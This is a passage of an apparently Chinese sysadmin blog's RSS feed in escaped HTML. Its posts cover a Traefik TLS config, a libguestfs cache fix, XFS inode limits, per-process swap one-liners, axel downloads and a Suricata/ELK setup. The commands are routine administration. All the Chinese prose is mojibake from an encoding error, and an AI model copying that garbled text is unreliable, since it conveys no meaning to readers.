&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;watch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ‰€æœ‰çš„é…ç½®éƒ½æ”¾åˆ°åˆ°/export/servers/traefik/dynamicç›®å½•ä¸‹äº†ï¼ŒåŠ¨æ€æ›´æ–°ï¼š&lt;/p&gt;
&lt;p&gt;certs.ymlæ¥å®šä¹‰è¯ä¹¦é€‰é¡¹&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;tls&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;certificates&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;certFile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/export/servers/traefik/ddky.crt&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;keyFile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/export/servers/traefik/ddky.key&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;options&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;default&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;sniStrict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;minVersion&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;VersionTLS12&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;cipherSuites&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;test7-01.ymlå•ç‹¬test7.ddky.comçš„é…ç½®&lt;/p&gt;</description>
    </item>
    <item>
      <title>vm.shåˆ›å»ºè™šæœºå¤±è´¥</title>
      <link>https://rendoumi.com/posts/20231221-vm_error/</link>
      <pubDate>Thu, 21 Dec 2023 10:35:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231221-vm_error/</guid>
      <description>&lt;p&gt;åœ¨172.18.30.1å’Œ172.16.60.10ä¸Š&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨vm.shåˆ›å»ºè™šæœºæ—¶ï¼Œä¼šæŠ¥é”™&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20231221-vm_error/2022-04-22_140600.png&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- Resizing the disk to 80G ... ERR: Could not resize disk.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å» /export/kvm/è™šæœºç›®å½•ä¸‹æŸ¥çœ‹log&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Could not open &lt;span class=&#34;s1&#34;&gt;&amp;#39;/var/tmp/.guestfs-101448/appliance.d/root&amp;#39;&lt;/span&gt;: No such file or directory
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è§£å†³æ–¹æ³•å¾ˆç®€å•ï¼Œæ¸…é™¤æ‰Cacheå³å¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rm -rf /var/tmp/.guestfs-0/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é™„ä¸ŠCentOS7å®‰è£… kvm çš„å‘½ä»¤ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum install qemu-kvm libvirt libvirt-python libguestfs-tools virt-install
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>Xfsæ–‡ä»¶ç³»ç»Ÿä¸‹å¢åŠ inode</title>
      <link>https://rendoumi.com/posts/20231221-inode_xfs/</link>
      <pubDate>Thu, 21 Dec 2023 09:35:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231221-inode_xfs/</guid>
      <description>&lt;p&gt;ç»ˆäºé‡åˆ°äº†inodeä¸å¤Ÿäº†ï¼Œç»†ç¢æ–‡ä»¶çˆ†æ£šäº†ï¼Œå¯¼è‡´inodeä¸å¤Ÿäº†ã€‚&lt;/p&gt;
&lt;p&gt;XFS æ–‡ä»¶ç³»ç»Ÿæœ¬è´¨ä¸Šæ˜¯æ²¡æœ‰ inode çš„é™åˆ¶çš„&lt;/p&gt;
&lt;p&gt;åªæœ‰ä¸€ä¸ªç¼ºçœçš„é™åˆ¶ï¼Œä½¿ç”¨ç°æœ‰æ–‡ä»¶ç³»ç»Ÿçš„ 25% æ¥å­˜å‚¨ inode ä¿¡æ¯ã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªç¼ºçœçš„é…ç½®åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹éƒ½æ˜¯å¤Ÿç”¨çš„ã€‚&lt;/p&gt;
&lt;p&gt;æŸäº›æƒ…å†µä¸‹ä¸å¤Ÿç”¨ï¼Œå¯ä»¥åˆ é™¤ä¸€äº›æ–‡ä»¶æ¥ç¼“è§£ã€‚&lt;/p&gt;
&lt;p&gt;ç»ˆæåŠæ³•æ˜¯å¢å¤§è¿™ä¸ª 25% çš„é˜ˆå€¼æ¥è§£å†³ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;root@zombie:~# xfs_info /srv/backup/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;metadane&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/dev/mapper/slow-backup &lt;span class=&#34;nv&#34;&gt;isize&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;256&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;agcount&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;17, &lt;span class=&#34;nv&#34;&gt;agsize&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2621440&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;blks&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;                       &lt;span class=&#34;nv&#34;&gt;sectsz&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;512&lt;/span&gt;   &lt;span class=&#34;nv&#34;&gt;attr&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;data&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;                       &lt;span class=&#34;nv&#34;&gt;bsize&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt;   &lt;span class=&#34;nv&#34;&gt;blocks&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;44564480, &lt;span class=&#34;nv&#34;&gt;imaxpct&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;25&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;                       &lt;span class=&#34;nv&#34;&gt;sunit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;nv&#34;&gt;swidth&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; blks
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;naming&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;version &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;              &lt;span class=&#34;nv&#34;&gt;bsize&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; ascii-ci&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;log&lt;/span&gt;     &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;internal               &lt;span class=&#34;nv&#34;&gt;bsize&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt;   &lt;span class=&#34;nv&#34;&gt;blocks&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;20480, &lt;span class=&#34;nv&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;                       &lt;span class=&#34;nv&#34;&gt;sectsz&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;512&lt;/span&gt;   &lt;span class=&#34;nv&#34;&gt;sunit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; blks, lazy-count&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;realtime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;brak                   &lt;span class=&#34;nv&#34;&gt;extsz&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt;   &lt;span class=&#34;nv&#34;&gt;blocks&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0, &lt;span class=&#34;nv&#34;&gt;rtextents&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸Šé¢ï¼Œæˆ‘ä»¬çœ‹åˆ° imaxpct=25 ï¼Œå°±æ˜¯è¿™ä¸ªé…ç½®äº†ã€‚&lt;/p&gt;
&lt;p&gt;å¢å¤§çš„æ–¹æ³•ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;xfs_growfs -m &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™æ ·å°±å¢å¤§åˆ° 30% äº†&lt;/p&gt;</description>
    </item>
    <item>
      <title>æŸ¥çœ‹SWAPäº¤æ¢ç©ºé—´è¢«å“ªä¸ªè¿›ç¨‹ç»™ç”¨æ‰äº†</title>
      <link>https://rendoumi.com/posts/20231215-swap_usage/</link>
      <pubDate>Fri, 15 Dec 2023 17:35:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231215-swap_usage/</guid>
      <description>&lt;p&gt;åœ¨æœºå™¨ä¸Šæ‰§è¡Œå‘½ä»¤free -g å’Œ free -k&lt;/p&gt;
&lt;p&gt;çœ‹çœ‹æœ‰å¤šå°‘ç©ºé—²&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20231215-swap_usage/2020-07-14_175935.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;8Gçš„Swapäº¤æ¢ç©ºé—´éƒ½è¢«ç”¨å…‰äº†ï¼ï¼ï¼&lt;/p&gt;
&lt;p&gt;å†ç”¨kbçš„å•ä½çœ‹çœ‹ï¼Œä¸€å…±8388604ï¼ŒåŸºæœ¬ç”¨å…‰æ‰äº†&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20231215-swap_usage/2020-07-14_180008.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æŸ¥çœ‹æ˜¯å“ªäº›è¿›ç¨‹ä½¿ç”¨äº†äº¤æ¢ç©ºé—´ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;find /proc -maxdepth &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; -path &lt;span class=&#34;s2&#34;&gt;&amp;#34;/proc/[0-9]*/status&amp;#34;&lt;/span&gt; -readable -exec awk -v &lt;span class=&#34;nv&#34;&gt;FS&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;:&amp;#34;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;{process[$1]=$2;sub(/^[ \t]+/,&amp;#34;&amp;#34;,process[$1]);} END {if(process[&amp;#34;VmSwap&amp;#34;] &amp;amp;&amp;amp; process[&amp;#34;VmSwap&amp;#34;] != &amp;#34;0 kB&amp;#34;) printf &amp;#34;%10s %-30s %20s\n&amp;#34;,process[&amp;#34;Pid&amp;#34;],process[&amp;#34;Name&amp;#34;],process[&amp;#34;VmSwap&amp;#34;]}&amp;#39;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;{}&amp;#39;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; awk &lt;span class=&#34;s1&#34;&gt;&amp;#39;{print $(NF-1),$0}&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; sort -h &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; cut -d &lt;span class=&#34;s2&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt; -f2-
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20231215-swap_usage/2020-07-14_180122.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;6504çš„qemu-kvmç”¨æ‰äº†4.8Gï¼Œçœ‹èµ·æ¥ä¸å¤ªç›´è§‚ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;find /proc -maxdepth &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; -path &lt;span class=&#34;s2&#34;&gt;&amp;#34;/proc/[0-9]*/status&amp;#34;&lt;/span&gt; -readable -exec awk -v &lt;span class=&#34;nv&#34;&gt;FS&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;:&amp;#34;&lt;/span&gt; -v &lt;span class=&#34;nv&#34;&gt;TOTSWP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;cat /proc/swaps &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; sed 1d &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; awk &lt;span class=&#34;s1&#34;&gt;&amp;#39;BEGIN{sum=0} {sum=sum+$(NF-2)} END{print sum}&amp;#39;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;{process[$1]=$2;sub(/^[ \t]+/,&amp;#34;&amp;#34;,process[$1]);} END {if(process[&amp;#34;VmSwap&amp;#34;] &amp;amp;&amp;amp; process[&amp;#34;VmSwap&amp;#34;] != &amp;#34;0 kB&amp;#34;) {used_swap=process[&amp;#34;VmSwap&amp;#34;];sub(/[ a-zA-Z]+/,&amp;#34;&amp;#34;,used_swap);percent=(used_swap/TOTSWP*100); printf &amp;#34;%10s %-30s %20s %6.2f%\n&amp;#34;,process[&amp;#34;Pid&amp;#34;],process[&amp;#34;Name&amp;#34;],process[&amp;#34;VmSwap&amp;#34;],percent} }&amp;#39;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;{}&amp;#39;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\;&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; awk &lt;span class=&#34;s1&#34;&gt;&amp;#39;{print $(NF-2),$0}&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; sort -hr &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; head &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; cut -d &lt;span class=&#34;s2&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt; -f2-
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20231215-swap_usage/2020-07-14_180338.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Linuxæ”¯æŒæ–­ç‚¹ç»­ä¼ ã€å¤šçº¿ç¨‹ä¸‹è½½çš„è½¯ä»¶</title>
      <link>https://rendoumi.com/posts/20231215-axel_download/</link>
      <pubDate>Fri, 15 Dec 2023 17:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231215-axel_download/</guid>
      <description>&lt;p&gt;Linuxä¸‹å¤šçº¿ç¨‹ä¸‹è½½å·¥å…·ï¼Œä¸”æ”¯æŒæ–­ç‚¹ç»­ä¼ ï¼Œæœºæˆ¿ä¼ æ–‡ä»¶å¿…å¤‡ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;axel -s &lt;span class=&#34;m&#34;&gt;9000000&lt;/span&gt; -a -n &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; -o ord_his.dmp http://172.16.24.2:8080/ord_his.dmp 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;-s é™é€Ÿï¼Œ9000000æ˜¯70Må¸¦å®½ï¼Œä¸åŠ så°±æ˜¯100Mæ¦¨å¹²
-n çº¿ç¨‹ï¼Œç¼ºçœæ˜¯4
-o ç›®çš„æ–‡ä»¶
-a è¿›åº¦æ¡å‹ç¼©å±•ç¤ºï¼Œå¿…é¡»åŠ ï¼Œå¦åˆ™ä¼šè¿›åº¦æ»¡å¤©é£&lt;/p&gt;
&lt;p&gt;æ³¨æ„ï¼šaxel æ˜¯å¯ä»¥è‡ªåŠ¨æ–­ç‚¹ç»­ä¼ çš„&lt;/p&gt;</description>
    </item>
    <item>
      <title>suricataåŠ ä¸Šelkåˆ†ææœºæˆ¿å…¥å£å…¨æµé‡</title>
      <link>https://rendoumi.com/posts/20231215-suricata_elk/</link>
      <pubDate>Fri, 15 Dec 2023 16:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231215-suricata_elk/</guid>
      <description>&lt;p&gt;suricata æ˜¯è·Ÿsnortå·®ä¸å¤šçš„ä¸€ä¸ªå…¥ä¾µæ£€æµ‹å·¥å…·ï¼ŒåŠ ä¸Šelkçš„å›¾å½¢ç•Œé¢ï¼Œéå¸¸çš„å¥½çœ‹ã€‚&lt;/p&gt;
&lt;p&gt;åŸç†æ˜¯suricataçš„logå‘åˆ°elké‡Œï¼Œè¿™æ ·å°±èƒ½é€šè¿‡kibanaè¿›è¡Œåˆ†æäº†&lt;/p&gt;
&lt;p&gt;ç¯å¢ƒï¼š&lt;/p&gt;
&lt;p&gt;1ã€ç‰©ç†æœºéœ€è¦å¼€16Gå†…å­˜ï¼Œ16CPUï¼Œéƒ½ä¸å¤ªå¤Ÿ
2ã€ç‰©ç†æœº172.18.30.2çš„br3æ˜¯äº¤æ¢æœºçš„Mirrorå£ï¼Œè¿›å…¥çš„å…¨éƒ¨æµé‡éƒ½è¢«é•œåƒäº†ä¸€ä»½
3ã€suricata-18-31-31æ˜¯è™šæœºï¼Œéœ€è¦å°†30.2çš„br3æŒ‚è¿›æ¥&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;virsh attach-interface  --domain suricata-18-31-31 --type bridge --source br3 --model e1000 --config --live
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;åŒæ—¶åœ¨31.31é‡Œï¼Œifconfig up eth1æŠŠç½‘å¡èµ·èµ·æ¥
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcpdump -i eth1æœ‰æ•°æ®å³å¯
